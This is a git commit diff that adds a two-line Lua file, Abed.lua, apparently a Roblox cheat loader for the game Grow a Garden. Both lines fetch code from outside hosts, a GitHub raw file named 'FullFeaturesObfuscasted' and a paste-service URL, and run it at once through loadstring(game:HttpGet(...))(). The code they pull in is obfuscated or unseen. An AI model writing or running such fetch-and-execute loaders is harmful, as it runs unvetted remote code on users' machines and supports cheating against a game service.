7f882ec356cd5d62dc3218a1b10d97562e53f2f1
KuniDevLua <profkunin@gmail.com>
2025-07-22 22:55:11 +0800

    Update and rename luaniabed to Abed.lua

---
+++ Abed.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/FullFeaturesObfuscasted"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/fcLQIflTAFmeRYty/raw", true))()
